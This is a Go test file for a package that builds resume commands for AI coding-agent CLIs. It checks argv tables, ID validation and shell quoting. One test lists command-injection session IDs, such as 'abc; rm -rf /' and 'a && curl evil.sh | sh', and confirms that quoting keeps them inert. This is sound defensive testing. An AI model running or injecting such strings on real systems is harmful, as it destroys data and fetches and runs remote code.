package resumerecipes

import (
	"errors"
	"os/exec"
	"strings"
	"testing"
)

func TestEmbeddedTableLoadsAndValidates(t *testing.T) {
	tbl, err := Load()
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if len(tbl.Engines) == 0 || len(tbl.Families) == 0 {
		t.Fatalf("empty table: %d engines, %d families", len(tbl.Engines), len(tbl.Families))
	}
}

// TestVendoredArgvPinnedToUpstream is the accuracy pin for the vendored half
// of the table. Expected argv transcribed from herdr `src/agent_resume.rs`
// fn plan() at commit 6f311498aeeb27c0973781961ef94e8d0016ed17 (v0.8.0,
// Apache-2.0). Editing a token or style in recipes.yaml fails here — which is
// the point: vendored reference DATA gets less review than vendored code and
// fails silently downstream (a resume that quietly cold-starts).
func TestVendoredArgvPinnedToUpstream(t *testing.T) {
	tbl := MustLoad()
	ref := func(v string) SessionRef { return SessionRef{Kind: RefID, Value: v} }

	cases := []struct {
		engine string
		want   []string
	}{
		{"claude", []string{"claude", "--resume", "S"}},
		{"codex", []string{"codex", "resume", "S"}},
		{"copilot", []string{"copilot", "--resume=S"}},
		{"cursor", []string{"cursor-agent", "--resume", "S"}},
		{"devin", []string{"devin", "--resume", "S"}},
		{"droid", []string{"droid", "--resume", "S"}},
		{"grok", []string{"grok", "--resume", "S"}},
		{"hermes", []string{"hermes", "--resume", "S"}},
		{"kilo", []string{"kilo", "--session", "S"}},
		{"kimi", []string{"kimi", "--session", "S"}},
		{"mastracode", []string{"mastracode", "--thread", "S"}},
		{"omp", []string{"omp", "--resume=S"}},
		{"opencode", []string{"opencode", "--session", "S"}},
		{"pi", []string{"pi", "--session", "S"}},
		{"qodercli", []string{"qodercli", "--resume", "S"}},
		{"agy", []string{"agy", "--conversation", "S"}},
	}
	for _, tc := range cases {
		e, ok := tbl.EngineByID(tc.engine)
		if !ok {
			t.Errorf("engine %q missing from table", tc.engine)
			continue
		}
		got, err := e.Argv(ref("S"), "linux")
		if err != nil {
			t.Errorf("%s: Argv: %v", tc.engine, err)
			continue
		}
		if strings.Join(got, " ") != strings.Join(tc.want, " ") {
			t.Errorf("%s: argv = %v, want %v", tc.engine, got, tc.want)
		}
	}
	if len(cases) != 16 {
		t.Fatalf("upstream pins %d engines, this test covers %d", 16, len(cases))
	}
}

// TestGeminiIsOursNotHerdrs guards the one row that is not vendored, so a
// future re-vendor pass does not delete it as "not upstream".
func TestGeminiIsOursNotHerdrs(t *testing.T) {
	tbl := MustLoad()
	e, ok := tbl.EngineByID("gemini")
	if !ok {
		t.Fatal("gemini row missing — it is ours, not herdr's; see driver_exec_resume.go")
	}
	if e.Source != "termipod" {
		t.Errorf("gemini source = %q, want termipod", e.Source)
	}
	argv, err := e.Argv(SessionRef{Kind: RefID, Value: "u"}, "linux")
	if err != nil {
		t.Fatalf("Argv: %v", err)
	}
	if strings.Join(argv, " ") != "gemini --resume u" {
		t.Errorf("argv = %v, want [gemini --resume u] (driver_exec_resume.go:388)", argv)
	}
}

// TestProbeGradeIsOnlyForBinariesWeRan keeps the verification grades honest:
// exactly the three engines whose --help was read on a host may claim `probe`.
// Promoting a row without running its binary fails here.
func TestProbeGradeIsOnlyForBinariesWeRan(t *testing.T) {
	tbl := MustLoad()
	probed := map[string]bool{"claude": true, "codex": true, "agy": true}
	for _, e := range tbl.Engines {
		if e.Verified == VerifiedProbe && !probed[e.Engine] {
			t.Errorf("engine %q claims verified:probe but is not one of the binaries we ran "+
				"(claude, codex, agy) — run its --help before promoting it", e.Engine)
		}
		if probed[e.Engine] && e.Verified != VerifiedProbe {
			t.Errorf("engine %q was probed on a host; grade = %q, want probe", e.Engine, e.Verified)
		}
	}
}

func TestPlanForFamily(t *testing.T) {
	tbl := MustLoad()
	id, err := NewID("abc-123")
	if err != nil {
		t.Fatalf("NewID: %v", err)
	}

	p, err := tbl.PlanForFamily("claude-code", id, "linux")
	if err != nil {
		t.Fatalf("claude-code: %v", err)
	}
	if strings.Join(p.Argv, " ") != "claude --resume abc-123" {
		t.Errorf("claude-code argv = %v", p.Argv)
	}
	if p.Engine != "claude" {
		t.Errorf("claude-code engine = %q", p.Engine)
	}

	if _, err := tbl.PlanForFamily("antigravity", id, "linux"); err != nil {
		t.Errorf("antigravity: %v", err)
	}

	// A family that resumes over a protocol must NOT yield argv. This is the
	// row that would silently cold-start if someone mapped kimi-code-ts onto
	// herdr's `kimi` recipe without probing the binary.
	if _, err := tbl.PlanForFamily("kimi-code-ts", id, "linux"); !errors.Is(err, ErrNotArgvResume) {
		t.Errorf("kimi-code-ts: err = %v, want ErrNotArgvResume", err)
	}
	if _, err := tbl.PlanForFamily("codex", id, "linux"); !errors.Is(err, ErrNotArgvResume) {
		t.Errorf("codex: err = %v, want ErrNotArgvResume (live path is thread/resume)", err)
	}
	// gemini-cli names an engine but the HUB does not splice argv for it — it
	// injects the ACP field, and the M2 driver threads --resume per turn on its
	// own. A table that said `argv` here would make the rewired splice rewrite
	// a cmd the hub has never rewritten.
	if _, err := tbl.PlanForFamily("gemini-cli", id, "linux"); !errors.Is(err, ErrNotArgvResume) {
		t.Errorf("gemini-cli: err = %v, want ErrNotArgvResume (hub injects the ACP field)", err)
	}
	if _, err := tbl.PlanForFamily("no-such-family", id, "linux"); !errors.Is(err, ErrUnknownFamily) {
		t.Errorf("unknown family: err = %v, want ErrUnknownFamily", err)
	}
}

func TestCodexNamesItsCLIFallbackWithoutClaimingIt(t *testing.T) {
	tbl := MustLoad()
	f, ok := tbl.FamilyByName("codex")
	if !ok {
		t.Fatal("codex family row missing")
	}
	if f.Mechanism != MechanismAppServer {
		t.Errorf("codex mechanism = %q, want %q", f.Mechanism, MechanismAppServer)
	}
	// It still names the engine so vision-parity L4's spawn-fallback rung has
	// somewhere to look — but PlanForFamily refuses it (asserted above).
	if f.Engine != "codex" {
		t.Errorf("codex family engine = %q, want codex", f.Engine)
	}
}

func TestKimiFamilyIsDeliberatelyUnmapped(t *testing.T) {
	tbl := MustLoad()
	f, ok := tbl.FamilyByName("kimi-code-ts")
	if !ok {
		t.Fatal("kimi-code-ts family row missing")
	}
	if f.Engine != "" {
		t.Errorf("kimi-code-ts engine = %q, want empty: herdr's `kimi --session` is an "+
			"unverified match for our compiled-TS CLI (ADR-054). Probe the binary before mapping.", f.Engine)
	}
	if f.Mechanism != MechanismACPLoad {
		t.Errorf("kimi-code-ts mechanism = %q, want %q", f.Mechanism, MechanismACPLoad)
	}
}

// TestEveryFamilyTheHubSplicesForHasARow pins the table against the hub's
// actual dispatch. Once the splice sites are driven off this table, a family
// missing here stops being resumed AT ALL — silently, as a cold start. The
// retired kimi-code family is the one that would have been dropped by anyone
// enumerating live engines instead of reading the switch.
func TestEveryFamilyTheHubSplicesForHasARow(t *testing.T) {
	tbl := MustLoad()
	for _, family := range []string{
		"claude-code",  // argv
		"antigravity",  // argv
		"gemini-cli",   // acp field
		"kimi-code",    // acp field, legacy rows only (#378)
		"kimi-code-ts", // acp field
		"codex",        // acp field -> thread/resume
	} {
		if _, ok := tbl.FamilyByName(family); !ok {
			t.Errorf("family %q is spliced by the hub but has no recipe row", family)
		}
	}
}

func TestSessionRefValidation(t *testing.T) {
	if _, err := NewID(""); err == nil {
		t.Error("empty id accepted")
	}
	if _, err := NewID(strings.Repeat("x", MaxSessionIDLen+1)); err == nil {
		t.Errorf("id over %d bytes accepted", MaxSessionIDLen)
	}
	if _, err := NewID(strings.Repeat("x", MaxSessionIDLen)); err != nil {
		t.Errorf("id of exactly %d bytes rejected: %v", MaxSessionIDLen, err)
	}
	for _, bad := range []string{"a\nb", "a\tb", "a\x00b", "a\x1bb"} {
		if _, err := NewID(bad); err == nil {
			t.Errorf("id with control char %q accepted", bad)
		}
	}
	if _, err := NewPath("relative/path.jsonl"); err == nil {
		t.Error("relative path accepted")
	}
	if _, err := NewPath("/abs/path.jsonl"); err != nil {
		t.Errorf("absolute path rejected: %v", err)
	}
	if _, err := NewPath("/" + strings.Repeat("x", MaxSessionPathLen)); err == nil {
		t.Errorf("path over %d bytes accepted", MaxSessionPathLen)
	}
}

func TestRefKindIsEnforcedPerEngine(t *testing.T) {
	tbl := MustLoad()
	path, err := NewPath("/home/u/.claude/session.jsonl")
	if err != nil {
		t.Fatalf("NewPath: %v", err)
	}
	// claude takes an id only; handing it a path must fail rather than build a
	// command that looks right and resumes nothing.
	claude, _ := tbl.EngineByID("claude")
	if _, err := claude.Argv(path, "linux"); !errors.Is(err, ErrUnsupportedRef) {
		t.Errorf("claude with a path ref: err = %v, want ErrUnsupportedRef", err)
	}
	// pi and omp are the two that do take a path.
	for _, id := range []string{"pi", "omp"} {
		e, _ := tbl.EngineByID(id)
		if _, err := e.Argv(path, "linux"); err != nil {
			t.Errorf("%s with a path ref: %v", id, err)
		}
	}
}

func TestCursorBinaryDiffersOnWindows(t *testing.T) {
	tbl := MustLoad()
	e, _ := tbl.EngineByID("cursor")
	if got := e.BinFor("linux"); got != "cursor-agent" {
		t.Errorf("linux bin = %q", got)
	}
	if got := e.BinFor("windows"); got != "cursor-agent.cmd" {
		t.Errorf("windows bin = %q, want cursor-agent.cmd", got)
	}
	// Every other engine is platform-invariant; assert that so a future
	// windows_bin addition has to come with a decision.
	for _, other := range tbl.Engines {
		if other.Engine == "cursor" {
			continue
		}
		if other.BinFor("windows") != other.BinFor("linux") {
			t.Errorf("engine %q varies by platform without review", other.Engine)
		}
	}
}

// --- shell safety -----------------------------------------------------------

// TestOrdinarySessionIDsAreNotQuoted pins the no-behaviour-change guarantee:
// adopting the table must leave every command that was already safe
// byte-identical, or the "keeps existing behavior" acceptance is a fiction.
func TestOrdinarySessionIDsAreNotQuoted(t *testing.T) {
	for _, id := range []string{
		"abc-123",
		"550e8400-e29b-41d4-a716-446655440000",
		"session_42",
		"/home/u/.claude/projects/x/s.jsonl",
		"a.b+c%d",
	} {
		if got := ShellQuote(id); got != id {
			t.Errorf("ShellQuote(%q) = %q, want unchanged", id, got)
		}
	}
}

// TestHostileSessionIDCannotEscapeTheCommand is the acceptance criterion's
// hostile-id test. The value arrives from the engine's own session.init
// payload and the hub splices it into a backend.cmd that tmux runs through a
// shell, so an unquoted `;` executes. herdr's own test uses this exact string.
func TestHostileSessionIDCannotEscapeTheCommand(t *testing.T) {
	tbl := MustLoad()
	for _, hostile := range []string{
		"abc; rm -rf /",
		"$(touch /tmp/pwned)",
		"`id`",
		"a && curl evil.sh | sh",
		"a'b",
		"a\"b",
		"a|b",
		"x\\`y",
		"* ~ ?",
	} {
		ref, err := NewID(hostile)
		if err != nil {
			t.Fatalf("NewID(%q): %v — these are legal ids, only shell-unsafe", hostile, err)
		}
		p, err := tbl.PlanForFamily("claude-code", ref, "linux")
		if err != nil {
			t.Fatalf("PlanForFamily(%q): %v", hostile, err)
		}
		// argv keeps it as exactly one element...
		if len(p.Argv) != 3 || p.Argv[2] != hostile {
			t.Errorf("argv for %q = %v, want the value as one element", hostile, p.Argv)
		}
		// ...and the flattened shell form keeps it inside one quoted word.
		// (A substring check for "; rm" would be wrong: the operator legally
		// appears INSIDE the quotes. The structural invariant below and the
		// real-shell round-trip after it are the assertions that mean
		// something.)
		assertSingleQuotedWord(t, ShellQuote(hostile), hostile)
		assertShellSeesOneWord(t, p.ShellCommand(), hostile)
	}
}

// assertSingleQuotedWord asserts the POSIX single-quote invariant: the result
// is one quoted word whose interior contains no bare `'`. Every apostrophe must
// appear as the four-character `'\”` splice, which closes the quote, escapes a
// literal quote, and reopens — so no shell metacharacter is ever outside quotes.
// This runs even where the real-shell check below has to skip.
func assertSingleQuotedWord(t *testing.T, quoted, original string) {
	t.Helper()
	if !strings.HasPrefix(quoted, "'") || !strings.HasSuffix(quoted, "'") {
		t.Fatalf("ShellQuote(%q) = %q: not a single-quoted word", original, quoted)
	}
	interior := quoted[1 : len(quoted)-1]
	if strings.Contains(strings.ReplaceAll(interior, `'\''`, ""), "'") {
		t.Errorf("ShellQuote(%q) = %q: bare apostrophe escapes the quoted word", original, quoted)
	}
}

// assertShellSeesOneWord checks the quoting against a REAL shell rather than
// against my model of one: it replaces the binary with `printf %s\n` and
// asserts the shell hands the session id back byte-identical, as a single
// argument.
func assertShellSeesOneWord(t *testing.T, shellCmd, want string) {
	t.Helper()
	sh, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("no POSIX sh on PATH; skipping the real-shell check")
	}
	// shellCmd is `claude --resume <quoted>`; swap the leading two words for a
	// printf that echoes the remaining argument.
	fields := strings.SplitN(shellCmd, " ", 3)
	if len(fields) != 3 {
		t.Fatalf("unexpected command shape %q", shellCmd)
	}
	out, err := exec.Command(sh, "-c", `printf '%s' `+fields[2]).Output()
	if err != nil {
		t.Fatalf("sh -c on %q: %v", shellCmd, err)
	}
	if string(out) != want {
		t.Errorf("shell parsed %q as %q, want %q", shellCmd, string(out), want)
	}
}

func TestShellQuoteEmpty(t *testing.T) {
	if got := ShellQuote(""); got != "''" {
		t.Errorf("ShellQuote(\"\") = %q, want ''", got)
	}
}

func TestDedupeKeyDistinguishesRefs(t *testing.T) {
	a := DedupeKey("claude-code", "claude", SessionRef{Kind: RefID, Value: "x"})
	b := DedupeKey("claude-code", "claude", SessionRef{Kind: RefPath, Value: "x"})
	c := DedupeKey("claude-code", "claude", SessionRef{Kind: RefID, Value: "y"})
	d := DedupeKey("antigravity", "agy", SessionRef{Kind: RefID, Value: "x"})
	seen := map[string]bool{}
	for _, k := range []string{a, b, c, d} {
		if seen[k] {
			t.Errorf("dedupe key collision: %q", k)
		}
		seen[k] = true
	}
	if DedupeKey("claude-code", "claude", SessionRef{Kind: RefID, Value: "x"}) != a {
		t.Error("dedupe key is not stable")
	}
}

// --- table validation -------------------------------------------------------

func TestParseRejectsMalformedTables(t *testing.T) {
	cases := []struct {
		name string
		yaml string
	}{
		{"bad version", "version: 2\nengines: []\nfamilies: []\n"},
		{"unknown style", "version: 1\nengines:\n  - engine: e\n    bin: b\n    style: nope\n    token: t\n    ref_kinds: [id]\n    source: s\n    verified: vendored\nfamilies: []\n"},
		{"unknown ref kind", "version: 1\nengines:\n  - engine: e\n    bin: b\n    style: flag_pair\n    token: t\n    ref_kinds: [uuid]\n    source: s\n    verified: vendored\nfamilies: []\n"},
		{"unknown grade", "version: 1\nengines:\n  - engine: e\n    bin: b\n    style: flag_pair\n    token: t\n    ref_kinds: [id]\n    source: s\n    verified: trust-me\nfamilies: []\n"},
		{"empty bin", "version: 1\nengines:\n  - engine: e\n    bin: \"\"\n    style: flag_pair\n    token: t\n    ref_kinds: [id]\n    source: s\n    verified: vendored\nfamilies: []\n"},
		{"duplicate engine", "version: 1\nengines:\n  - engine: e\n    bin: b\n    style: flag_pair\n    token: t\n    ref_kinds: [id]\n    source: s\n    verified: vendored\n  - engine: e\n    bin: b2\n    style: flag_pair\n    token: t\n    ref_kinds: [id]\n    source: s\n    verified: vendored\nfamilies: []\n"},
		{"argv family with no engine", "version: 1\nengines: []\nfamilies:\n  - family: f\n    engine: \"\"\n    mechanism: argv\n"},
		{"family points at missing engine", "version: 1\nengines: []\nfamilies:\n  - family: f\n    engine: ghost\n    mechanism: argv\n"},
		{"unknown mechanism", "version: 1\nengines: []\nfamilies:\n  - family: f\n    engine: \"\"\n    mechanism: telepathy\n"},
	}
	for _, tc := range cases {
		if _, err := parse([]byte(tc.yaml)); err == nil {
			t.Errorf("%s: parse accepted an invalid table", tc.name)
		}
	}
}
